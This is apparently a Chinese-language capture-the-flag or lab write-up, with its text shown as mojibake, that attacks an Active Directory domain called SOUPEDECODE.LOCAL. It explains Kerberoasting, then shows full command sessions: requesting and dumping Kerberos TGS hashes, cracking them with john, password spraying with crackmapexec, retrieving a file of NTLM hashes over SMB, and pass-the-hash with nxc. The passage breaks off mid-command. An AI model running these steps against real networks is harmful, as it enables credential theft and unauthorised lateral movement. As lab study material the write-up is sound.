#### 1ï¸âƒ£ SPNï¼ˆService Principal Nameï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ
+ **å®šä¹‰**ï¼šSPN æ˜¯ **æœåŠ¡çš„å”¯ä¸€æ ‡è¯†**ï¼Œç”¨æ¥è®© Kerberos çŸ¥é“â€œæˆ‘æƒ³è®¿é—®å“ªä¸ªæœåŠ¡â€ã€‚
+ **ä½œç”¨**ï¼š
    1. Kerberos è®¤è¯æ—¶ï¼Œå®¢æˆ·ç«¯éœ€è¦æ‹¿åˆ°æŸä¸ªæœåŠ¡çš„ç¥¨æ®ï¼ˆTGSï¼‰ã€‚
    2. SPN å‘Šè¯‰åŸŸæ§â€œæˆ‘è¦è®¿é—®çš„æœåŠ¡æ˜¯ Xï¼Œç»‘å®šåœ¨è´¦å· Y ä¸Šâ€ã€‚
+ **ä¸¾ä¾‹**ï¼š
    - `MSSQLSvc/db01.soupdecode.local:1433` â†’ è¡¨ç¤º SQL æœåŠ¡ç»‘å®šåœ¨æŸä¸ªè´¦å·ä¸Šã€‚
    - `HTTP/web01.soupdecode.local` â†’ è¡¨ç¤º Web æœåŠ¡ã€‚

æ€»ç»“ï¼š**æ¯ä¸ªè¿è¡Œåœ¨åŸŸç¯å¢ƒä¸‹çš„æœåŠ¡éƒ½æœ‰ SPNï¼Œé€šå¸¸æ˜¯ç»‘å®šåœ¨åŸŸè´¦å·ä¸Šçš„**ã€‚

---

#### 2ï¸âƒ£ Kerberoasting æœ¬è´¨
+ **ç›®æ ‡**ï¼šè·å–åŸŸç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯æœåŠ¡è´¦æˆ·ï¼‰çš„å¯†ç ã€‚
+ **åŸç†**ï¼š
    1. æœåŠ¡è´¦æˆ·ï¼ˆå¸¦ SPN çš„è´¦å·ï¼‰åœ¨åŸŸé‡Œæ³¨å†Œäº† SPNã€‚
    2. å®¢æˆ·ç«¯è¯·æ±‚è®¿é—®æœåŠ¡æ—¶ï¼ŒåŸŸæ§ä¼šç”Ÿæˆ **TGSï¼ˆTicket Granting Serviceï¼‰ç¥¨æ®**ï¼Œç”¨äºè®¿é—®è¯¥æœåŠ¡ã€‚
    3. TGS ç¥¨æ®æ˜¯ç”¨æœåŠ¡è´¦æˆ·çš„ **NTLM hash** åŠ å¯†çš„ã€‚
    4. æ”»å‡»è€…å¯ä»¥è·å– TGS ç¥¨æ®å**ç¦»çº¿ç ´è§£**ï¼Œå¾—åˆ°æœåŠ¡è´¦æˆ·æ˜æ–‡å¯†ç ã€‚
+ **ç‰¹ç‚¹**ï¼š
    - ç¥¨æ®æ˜¯ç¦»çº¿ç ´è§£ â†’ ä¸ä¼šè§¦å‘å®æ—¶è­¦æŠ¥ã€‚
    - ä¾èµ–äº SPN å·²ç»æ³¨å†Œåœ¨åŸŸç”¨æˆ·ä¸Šã€‚
    - Kerberoasting é’ˆå¯¹ **åŸŸè´¦æˆ·ï¼Œå°¤å…¶æ˜¯æœåŠ¡è´¦æˆ·**ï¼Œè€Œä¸æ˜¯æ™®é€šæœ¬åœ°è´¦æˆ·ã€‚

---

#### 3ï¸âƒ£ ä»€ä¹ˆæ—¶å€™ç”¨ GetUserSPNs å·¥å…·
+ **å·¥å…·ä½œç”¨**ï¼š
    1. æšä¸¾åŸŸå†…æ³¨å†Œäº† SPN çš„ç”¨æˆ·ï¼ˆæœåŠ¡è´¦æˆ·ï¼‰ã€‚
    2. å¯ä»¥ç›´æ¥è¯·æ±‚ TGS ç¥¨æ®å¹¶å¯¼å‡ºä¸º hashcat/john å¯ç”¨æ ¼å¼ã€‚
+ **ä½¿ç”¨åœºæ™¯**ï¼š
    - ä½ åœ¨å†…ç½‘è·å–äº†ä¸€ä¸ª **åŸŸç”¨æˆ·å‡­æ®**ã€‚
    - æƒ³è¦æ‰¾åˆ°é«˜æƒé™æœåŠ¡è´¦æˆ·å¹¶ç¦»çº¿ç ´è§£å¯†ç ï¼ˆKerberoastingï¼‰ã€‚
    - é€šå¸¸æ˜¯æ¸—é€æµ‹è¯•é˜¶æ®µ **æ¨ªå‘ç§»åŠ¨å’Œææƒå‰çš„æ­¥éª¤**ã€‚
+ **é™åˆ¶**ï¼š
    - å¿…é¡»æœ‰åŸŸè´¦æˆ·å‡­æ®ï¼ˆæœ¬åœ°è´¦æˆ·ä¸è¡Œï¼‰ã€‚
    - ä¸èƒ½é’ˆå¯¹ SMB æœ¬åœ°è´¦å· Kerberoastã€‚

## SPNè·å–
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.0.91.3
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>               
```

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.0.91.3 -request 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 


[-] CCache file is not found. Skipping... 
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

ğŸ”¹ è§£æ
CCache file is not found
Impacket æƒ³ç”¨ Kerberosç¥¨æ®ç¼“å­˜ï¼ˆccacheï¼‰ åšè®¤è¯ï¼Œä½†æ²¡æ‰¾åˆ°ç¥¨æ®æ–‡ä»¶ã€‚
è¿™ä¸ªå¯ä»¥å¿½ç•¥ï¼Œå¦‚æœä½ æ˜¯ç”¨æ˜æ–‡è´¦å·å¯†ç è¯·æ±‚ TGS ç¥¨æ®ã€‚

KRB_AP_ERR_SKEW (Clock skew too great)
Kerberos éå¸¸ä¾èµ– å®¢æˆ·ç«¯ä¸åŸŸæ§æ—¶é—´åŒæ­¥ã€‚
é”™è¯¯æ„æ€ï¼šä½ çš„ Kali è™šæ‹Ÿæœºæ—¶é—´å’ŒåŸŸæ§ï¼ˆ10.0.91.3ï¼‰æ—¶é—´å·®å¤ªå¤§ï¼ˆé»˜è®¤è¶…è¿‡ 5 åˆ†é’Ÿå°±ä¼šæ‹’ç»ï¼‰ã€‚
```

ä¸»è¦é—®é¢˜åœ¨äº_<font style="color:rgb(90, 222, 202);background-color:rgb(0, 22, 40);">Kaliè™šæ‹Ÿæœºæ—¶é—´å’ŒåŸŸæ§ï¼ˆ10</font>_<font style="color:rgb(255, 133, 99);background-color:rgb(0, 22, 40);">.0.91.3</font>_<font style="color:rgb(90, 222, 202);background-color:rgb(0, 22, 40);">ï¼‰æ—¶é—´å·®å¤ªå¤§ï¼ˆé»˜è®¤è¶…è¿‡</font>_<font style="color:rgb(255, 133, 99);background-color:rgb(0, 22, 40);">5</font>_<font style="color:rgb(90, 222, 202);background-color:rgb(0, 22, 40);">åˆ†é’Ÿå°±ä¼šæ‹’ç»ï¼‰</font>_

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# sudo ntpdate 10.0.91.3
2025-08-20 13:16:30.188845 (-0400) +53998.182220 +/- 0.000248 10.0.91.3 s1 no-leap
CLOCK: time stepped by 53998.182220
```

_<font style="color:rgb(90, 222, 202);background-color:rgb(0, 22, 40);"></font>_

_<font style="color:rgb(90, 222, 202);background-color:rgb(0, 22, 40);"></font>_

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.0.91.3 -request 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>               

[-] CCache file is not found. Skipping...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$f3767383cfeb5a5440c9b0ab3de4a30a$39c77960d4c3362ab5973a965de722db38639c955683cc4876e9f6089a4df6005830b238d4e81b4a994a9919de64cef2d7de9f57a06b8846e6189319c9db3d10beaf618cd0d3db3fca71f9657f215c7a8a238dc86af2ed9cdb1c567fbf99ec1c87d3c9b668802ecf55ed22f95702b48fd9340e22e5ea5a88c150340bbcb9f821f9830c55ed74d8db1581d6a8d1bed65ad8f141ddd186dd2a066c497d80556f496f69cfaf69306aef708e41dff44a8e9b6fcffeeb079009c64d648a828273bd5eb33e2374c8aa5cd127e9ed688ac4849dd136f384837d743f7cce4bd46e657a3012d1e7f567478f2660d76e2d854e2ffb8c8e47ce6953f48e7142ea162dad7bfe1810687dabe3da5646682a5bb77b940f471755b79184de187f3fc179b4271e68186d51a1cfca35f797b782fec13356b830c11dee5c2daae7f06fe885bf4912c1795ad60965beda2d671d7cb4e7e4d3098e743565a09fba951321ff0abb68d0f3c8ebdb72cbeaa49782e68a3726fc3901db8087251550a0e88bb0f509b4457b480be5b2e7017dedc9724c2465c3229d53832366f01d1f895e82407728a8400ddbc3ed3d8579459e2ad2ec52ec809aed47e22a5ef9e2f16e3babb2477056c675e0ae4d0c42591eaed9e73b52ead491548c6ea76e58411af0ffeb8856badebaf16a2e5664de2d4334b1fc7b0890dd945ac899eae19ec79b894b93fd936619aa4cbd9f5fb63331ae936dffc5e0880d39b107291a6dd96f2ea5814505cb29d8f74d4b0b26ff0db10e475aebc7a5fd2f27b9b656c881c5d962faae8efeddb30ecc2018a65a097e944970b357197c2713b32dcd744001b8e1e4a3a8e37862cce1d5190226c743c82778673e9e216571a0328c77177e81b3c7dd7239e0f2031007c58c584f60d581be9b9145411897bd87577b2d027646f9b5f7319cfee48910646b5f31aed50b430529821924b9b94ed355703d8897b4df1cc42f0762c072e616be071e5f493e0b2bf5099ab4e3a8af6177074100556fdebec0315d00e84482da49cd56660d5fcd4b8435fef107329646abe5c0a6ca79c95bd82fc2b211054107b950e1d3b995fd095b998896fb80d9bbe03b7673dec584a93b25917964b5a2a0fa319881da217cf3e2020face48848734b5d960c50278419702a091237c42cf7b1aff159e9ec3b369e7677d1408d10df6a2af8a5a10d090f06af5df2a59118545feddf8659d88aef008ae7171fd5cd0e7ea3e2c3248a0a186c5221069d246d6ea67f2a493195c03f574086926ec245fd942185444dc51411e0f6dac4df227b6bc585c01e896e555d697149f14a22cff5904dbe2f2ac28ccbcfa1628c175984a90bc70133eb41ef779f44013a3647ceaf6875fec98093dca38ccb77139b969a3d1bc26366068c0451697855155370c9dca75116b90d99f7d043ac7ce70aa90b3b57fe94bb7b167e6f1b79ba89d1badfa8b4aeec393eb3a22e7d0d3d43330404a61e13bc67
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$ab7469761075f86228b2fd22b112ee67$c2c7811a3012e3f18c193fdcd71e702d5181e7537fe3d6bc6d1a5a62aea97e90bf906beb32e20b1c6af719ad66127fcacdc365735fbc44cc3180a346e76083cc0d9d9ca55d99e6c45eb6694f5459dc6f7165675e9476c195195cbb105c25533f38fb1ebd3dba58d35038fc43321f51d95af06066d7f4450f074215c8d1fc7832f6bedbdc8a30d95a2ad17e04d8a04c2344db0414a33d0666d5d7f67e50e1573a5dee8f986baad095b60e96bc9252f2711ce71545242cdb2d46ea624beb90d21f7671eb076d2c593de8ea668968464f4202f676d4157e34237da5907477c8c7c54a45b1503818880b62c34f4515435b5e88e147c79a54ea69f70c56fd5dd97add63acf7a530499e26400531a7dde63d8158a74f5e94651e616865ddf29d33c781b529fc3d8685ac01ca0850528d60cdc505832dbe759a5f92f0bac1f42772def41f47e455c823082138757df39e59d6d40464354ef9c4f2b80dc71f723072197129e75c38f7edd75b49b3cbeb57a2fe4c81c7959dc4038ab6c89aa1bfd2fbaa027b4e4a609d8adbf98822862578bdf6aebd8fe2da04a57ed522d7193a177d5373a176c886162aa26d3ac4b1383aa5edeeea8991bdbe6ea6832b8617e74be40afde752d611084576d70a27d5f99f29306805039aec5855772f207572e5ee73485cac223b07e8ecb20df0a5449a2a2158f50b1284fce29425bf39a8924f89bf128e9413ec87e9987425516ab000177db7bdfa9371aa98a2084fd8990f6e1f77f98223f1839881c5d158bfbc3612660cdc4bb505f7370a2e0fe46993558da958ac6de774126fab705bf11ef9ad67c2042133381a96a436c988d8eb09103d8f2e8a89c4430587f5e37120e23a850a2f2cf2d49fab144de77ce86a6f9fa45c43075dcbe2adc874a081a2f35490f252948ed9657986d77299e8598976ebacf535f9349157b4f0e9a7a54aafc2a1be7507e6f424633c462858d4cf5c99966232209f0a62775a990bbac441ca8c8fd1e05a7ad77f6e591d443d63b300e359aeca679839909b80b787a0562dcfad6d26da4a7bdfca598795933ec645ef0e969ef34a1ba4873e29ca40bc286616a2e9a43c67e239c092de5aa53c82880ac2c38feb703bd904a9017755f109300b9e868688faf6c4b7a7318851f1d6c1873e1919e724b99b336cf24ad8f6c9bd269b24d9d4fdbd84d064d582b9a8a5fbb0ae1c42ed598beaf663086d248c80ec7c4f0eb9379d281796c42cd76a319f9ec90bdb37c318860ac4a1497290ae1ff8001762edb76a4f7bd6642e099c72b81a5440cec17447cdb06cd5a7f4ad81968499f101035c5768a4d2e473cb520c43abc5aac68e2c174a8fffde69343a63f97bc21aaf9fa4774edf41b69ec314732a428ae35ad36a4ba9aa55fdc6cdb4f55fc64deec1a3bd7a433b064287cf1a9e46c1317f1f75251e946f2c9e02bb0ad3b8f4139c82b832633c8cc9f70649a07c6d5ad38999d8ad98815c5d45
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$2bff5855b0f6911478f544849e8e9823$53e384caccb4874a4ed81e37dd3a368563aba75da62476bb3202806db89deefad7ed532bf604d53ac5275d5fb80cdfb6ad6653c693852bcbeec917a908f7970474df952d10ea3586b90fdc38efc0a8cc4d743a977bb5eb075b8ab50fed0169c642cccc812eb54c91622ff7ed0b355f9c9db4258badb0c7cf20fd400f4342ca8f616db95cdd7bcd583c967fe0b798c8ec6220ed11784641c6ab56910cccda7fb7a36319bf0a6dcce101e3b45b525a5cab370bd995240b1774ac2aa9fcebfd66bbb8204aeb9378c46ec9377374b46c90b239ce10a03a80638dfb163055fd2be6834f7d7b67776c07b9a1372b24c3b5fc48f5f3010fb43e0c7b045a734efb10a809ace052bf7114e24d0dcff0424b64a18a098e26aaa7e8cd27a5ead4319bba5d2459625ecd18e04b472bcbe574a61339532da49ad51ab643896040385378e6a2ca3a5dc0cfea1d66115f88acedad62762b7aab8142fda5a039b3b6b03cee8856a432d76aa7db6137d2a40faf878d064fe8b37dcb1ca7e631f60d1eb99691ca563ee3c2a738d9cf83887df44fc5736ac0945951d9a87d76571413a26c96f971c856356c422a4b18d8a912a65527eedb7021ed1b987d60ea7524ba70c20e09e14a041e0e5c4ce005648ca2dd31516e53c3a75e83664db7d02c201de18656a8e046a47b5b6b88fe6bed05c5ea0b0cb69c2d148d9a14b2f4bdba53b35e44b920262b348d2c04c05b29e8bb7f266467f8c63fb0186b683373ad0954b35ffabbfb404530a4ffca93bfe8d73cb6bbf5b68fea56a3f313c2f164f22a0140f2d6e202c5af2ab2f9df517eba861c10bc6e016fb32ed6010c012c45d314cee4d17d6dc230168f3706fad2f6fb3752447c229ab5d41da208e3bf5ab6387860d15e3fab9ec981610129de2ba09b50daab1aa9253e9051e6782fc5fce50f8994cc01f7e83543813b8d5c09e41ab709919385ae00e8c1a1774f60a6354aca790be856c432742029a22425fad11901b79c8361897730b6a3afdf17a11979bdb8e418af540331a1bcaf88b9e7c5f82831299190f7d33a5ebcf910950b05d063237b7b88492d6bb741f48f34d3598399dd81d073aa620a1f42a7d67ee813ec51c556f61863bd9e3092e5329aa8b2099f65eab731c6f6c5951764216be679c89b8f6e2bd9ad5330b725c791b425358355b5cfa61a0aa72e7bafa47e99e2aabe6012a4550c787df880c33b095d4feda926267dbb39f0955ef9cdaa0732992c18251f0f64e03fb413234fbf635aea4c2d691adefd069726a2cfdfe063b2c239ffb57394eebdd82e8ef50863625672a690df2421c44fb6998cad374e54c3be335c49101e0a379b718684a905166aae1855d8f03c7a9fd8921690b502c205b24d9785ed9f89679ba1597d78333f32e97ceb292681a7b68592433a6f5c8ba7aab82d7c72985e3cb0c19d0cc3ed22cc26aa554f458ca750835402bb7448fe98d7e7634639261a4785d59c6e5d2a6d
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$31cd7b6ddd70d011ece9ba3dabbf35da$9d184606b31a074d6a0dbfdd8b524d02224378511924a26fe81ff7bf96996cdb64e0b1ec5f73005cc68765b8447bf146fc6b53974f14277873596c16b4d61684cfd10ac9bd4fba97af298693d6ff3d0c2cfd17953a87dc980df9a3b51e89a2d5d4952e31660e9ba72b6341e9f3b1a095ebe9c58410502a432f4be68da6fc7d01ce7f3894ae99d8f4466557dbc303a4aafee6f79d5c0ff7fd816781627900c74dca438eab5f07fedb31cf2eb746be1aaebdc6b4cd01526f316d2872fa33798cda82cb0c0ec16c29f7fa47c165038fdaca19670d3b5d521b67ba4989a33304719fc8a4b9e5435124417d569f6d688a073fdd2215342877362ffcda765a35ad8ffdab89a0ae0bd12f38310a43e07976656a57dfcc041a20a25ce35921be4e809bdd4e4320a4be3cac66061a88faef0bf421630688451438c4e22771251e4764a7909bcbfc06aa12685db44ea6799822ad552f044a60a2777ef06dc9638840cb21532af52b1f88ce0db1526f507eacb789b10d450ad8372a2d0d84ff8cf95ef3e07d1500f01f2657f351ba115b2277e89db979c590923df5484e75d2bf028d9c08b1d51b322605fc169e08f36d3da1cf1ebad4fb8c00540ca032ef83bfc040a78b15325a48738ad0047b1ea91f538d078c5709bfd4128df2825060afa8ad1ba45a2d2af143889cae26a7ac31fbbc73507cd663728eb402fa0fe1a4253e2cc5606bc6f1d6310a35c99ecb2b9ccb5fb1d454c4c13ed0224ba6f5d75cc09a179a63837ebd92932422cc804b254e95181d569f044ef22335830e782a194831b4818f00789ff3de1d2440bd624e6d9cd09bb356a788a97de91561d2ce0d20f8369494a52cadfe2017f0e24314eed718341c3616219115ccd637bbc6db96052cb2d518c8c720e9b70f490ceee23d6c45568466e9ab7a1548e1550466786c51c6bc5e365f8324203f8af07a0d7648e69c936a248dbf74f6decffd91e73653fc0042650054e74bffb200b4532d32dc66ce3c6f62a0cd9127cc2a1b86772f3cd3cee8b9681ead9127c6329b675d75fec80398ab64e5b329d19156ff13f83bf4519ca7924dd8fd0d94b21c771723e8254d2cb135568c59549291111cb458ed036a8c999533ab87303745411e0fe5e957688ad489878ccf08d3bf8226cac536c07fbee73b479f155cc37107fc59160dbd5f52caac082a8f2d3f2908bf1bbdbbe6bec3c8b25d1c76a402c6e989750e89ff32aafcb4f341929831101266aa55b225e285f3625a519443a60da00a54f17d817f38c1e34276543db03ea3efa58e8d6f293887955e13a4cc51a0bfb9f5f7ae06377427fe5bf61fe70679ee849b88f7999b211fd32863ccd276222fabe66c30745c3fd4ace960c890974cf98c562c14fb5f2d9e49eaabe3c84c40f19610ed651e27918bcd53e43b9f62b124247e39aa96d8035d0f58f5a48f2e85c3c71bd9eda88e70fa2ffdce2507369928def0b6f4db739c9d7673d0c3ff
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$829f0d1678f8e67049da813ed36ef73f$ca50d9fa720b1cf6357064e6cb3fb356be980dcf8a44c69869686bbf81de12d9d3ac5bffd3ba66992722f4b192a23cd1a6ccf464764a6d4c937a3851066d6384accdc7ce69799b5e783e057bbed6b71eac1af1eee45c41a8cffe7a172c8d23b26665f899783304c910a2303f76cefd4927fda756118af16e90b3d8352cc0df50c02abad581533d19cb72fdce237cdff8af45b3b3b4480a1f265567c09850978779eb088f415c454209558ce8c5423afba421b9fe6dbe79ffa135f09023e925c7b1a5f20738bb926e9de4d9b9fe2cda7e75f79376c82df3241cc552129dc72d9239f838b140460d812e4a7a773c9f6b1843846c3210497cd2477b4bbbdd623aaf0fdfefb3b174e3b38aa89800ad689b8b262b14b4c3c324a806cd8848070812e3475e16eb74634d53b429b94b8a2a78f0d6df94531ee1c5be659c580db37f01c7449ac19a4807bbf9eed5d912451a0f3daaa1439c832dff702c8f6a5176f8b7071e4f3ba5d49ea3f1eb774c8e46bcbf3e760d24830d9aa0d435d8e3c94430977af97cf968900e180c8f64df2352a47592dc60b905f1404dd55818599c7b7217eecae3a7e99006872a41ef5bde9d1d5e27561ccf8898f3aed2184cb6ce415215334c3a71bec044eeb72b5218be00ed6992325f2572526d67a95dfdf3c26c9d7b42fb0d11cd4ffb2f0f7edfce0ecdb6108a6dc533fb1e6fb48a0691c5d4308f4cd61e1e3858f120ae0f0cadfd9fcccebf8e855cec9d21c9143c45c824489d55df4e6c4beebab811c253b148d172bf3d886369f5f870822682de8105ceb7ed681884df57e45190e6decf38696f304f8b6ad909b8c106b33fd6c6d24936cfa87ff536c5e1b6bca93d813c4142b1cfa33218b68171c6096c6aafdeb9630411526ff96adac8b0484d47588051d4a73e571aa51c91269f7feede165007d6b1f7cd9e09b4d27dbd1c7fd61145cc8bb230f747f6ef1b312585a0f372193e2823220def36e0860cea0de3e450e4fa137892fb21be597800861cb50e5f3cb8bf9da60c56ca046548b29b0f5e8bd4e2f6646a1ce7b428573eb9da811c3958c43a21f768039cae3b93eebea0205715393ead8789dc1ed1f7097a43faa9f0a4cf79b8e02dc388045e4431ea523f89f3bd860669b4911deb29fd93d97e82884573523c2b81217e9f32aafc38484abbc04b92e339a058ddf4f4ad02cb954985b19467c6d353ffa1a240d1e6deaaeb670f27df6ea1aeb3336681c28801bbe4eb0c9b3eb17748d15ab908c4365bacd0ae64a7462c5c02f2dc7eda13d484d1cf3cf6f4d71175092280646ab9287c45bf701f3ffb4b5f6ab89c8950ccfa22ff6a074b2b985f14e24fe796020695b1fe56e0d3efd36eb8f38a70f72ac31762508b7c47a9dd60dc43ede2bf9100beb70c43f0c6275fdbd8c9b35588d8d04e4a5ae8bf53fd293244ff4cd88778f451fde85f79a2f97593d863f95e874fc5af4f8f09d63a113f82ff5204903667
```

| é—®é¢˜ | åŸå›  |
| --- | --- |
| ä¸ºä»€ä¹ˆæ™®é€šç”¨æˆ·èƒ½æšä¸¾ SPN | LDAP é»˜è®¤å…è®¸è¯»å–åŸŸç”¨æˆ·å¯¹è±¡ï¼ŒSPN æ˜¯å…¬å¼€ä¿¡æ¯ |
| ä¸ºä»€ä¹ˆæ™®é€šç”¨æˆ·èƒ½è¯·æ±‚ TGS | Kerberos å…è®¸ä»»ä½•ç”¨æˆ·è¯·æ±‚è®¿é—®æœåŠ¡ç¥¨æ® |
| ä¸ºä»€ä¹ˆèƒ½æ‹¿åˆ°æœåŠ¡è´¦å· hash | TGS è¿”å›çš„ç¥¨æ®ç”¨æœåŠ¡è´¦å·å¯†ç åŠ å¯†ï¼Œå¯ä»¥ç¦»çº¿ç ´è§£ |
| ä¸ºä»€ä¹ˆæ™®é€šç”¨æˆ·å¯†ç æ²¡æ³„éœ² | æ™®é€šç”¨æˆ·é€šå¸¸æ²¡æœ‰ SPNï¼Œæ— æ³•ç”Ÿæˆ TGS hash |


```c
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.0.91.3 -request | grep '\$krb5tgs' > hash.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# john --wordlist=Desktop/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:11 62.62% (ETA: 13:37:24) 0g/s 818641p/s 4093Kc/s 4093KC/s coconut24..cococy
Password123!!    (?)     
1g 0:00:00:16 DONE (2025-08-20 13:37) 0.05903g/s 846738p/s 4020Kc/s 4020KC/s !!12Honey..*7Â¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                                                                                   
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# john --show hash.txt                                         
?:Password123!!
```

# å¯†ç å–·æ´’
 å¾—åˆ°å¯†ç åè¿›è¡Œå¯†ç å–·æ´’ï¼Œçœ‹å¯†ç å±äºå“ªäº›ä¸ªç”¨æˆ·  

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# crackmapexec smb 10.0.91.3 -u user.txt -p 'Password123!!' --continue-on-success | grep + 
SMB                      10.0.91.3       445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
```

### SMBä¿¡æ¯æ”¶é›†
è·å¾—æ–°ç”¨æˆ·åå†é€šè¿‡SMBè·å¾—ä¿¡æ¯

ç»è¿‡æµ‹è¯•ï¼Œæœ€åå‘ç°`backup`æ–‡ä»¶å¤¹è¯¥ç”¨æˆ·æœ‰æƒé™ï¼Œå¹¶è·å¾—æ–‡ä»¶ `backup_extract.txt`

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# smbclient //10.0.91.3/backup -U SOUPEDEODE.LOCAL/file_svc%'Password123!!' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Mon Jun 17 13:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024

                12942591 blocks of size 4096. 10875720 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (62.2 KiloBytes/sec) (average 62.2 KiloBytes/sec)

```

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# cat backup_extract.txt                                                                  
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

| â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]<br/>â””â”€# awk -F '[:]' '{print $1}' backup_extract.txt > username.txt<br/><br/>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]<br/>â””â”€# awk -F '[:]' '{print $4}' backup_extract.txt > passwd.txt |
| :--- |


å¯ä»¥é€šè¿‡NTLMhashè¿›è¡Œæ¨ªå‘ç§»åŠ¨

 nxc smb 10.0.91.3 -u username.txt -H hash.txt  

> â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
>
> â””â”€# nxc smb 10.0.91.3 -u username.txt -H passwd.txt
>
> SMB         10.0.91.3       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)                                                                    
>
> SMB         10.0.91.3       445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
>



åˆ©ç”¨smbclientå’Œ<font style="color:rgb(38, 38, 38);background-color:rgba(0, 0, 0, 0.06);">psexecå¤±è´¥</font>

+ **FileServer$ æ˜¯æœåŠ¡è´¦å·**
+ é€šå¸¸åªå¯¹æ–‡ä»¶æœåŠ¡å™¨ç›¸å…³èµ„æºæœ‰æƒé™
+ é»˜è®¤æ²¡æœ‰ **ç®¡ç†å‘˜æƒé™**ï¼Œæ— æ³•åœ¨è¿œç¨‹ä¸»æœºåˆ›å»ºæœåŠ¡æˆ–æ‰§è¡Œè¿›ç¨‹
+ `psexec` éœ€è¦åœ¨ç›®æ ‡æœºå™¨ä¸Šåˆ›å»ºä¸´æ—¶æœåŠ¡ï¼Œå› æ­¤éœ€è¦ç®¡ç†å‘˜æƒé™
+ **ç›®æ ‡ä¸»æœºä¸æ˜¯ FileServer$ çš„ç®¡ç†èŒƒå›´**
+ CME è¾“å‡ºæ˜¾ç¤º FileServer$ èƒ½è®¿é—® SMB å…±äº«ï¼Œä½†ä¸ä»£è¡¨èƒ½æ‰§è¡Œè¿œç¨‹å‘½ä»¤

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
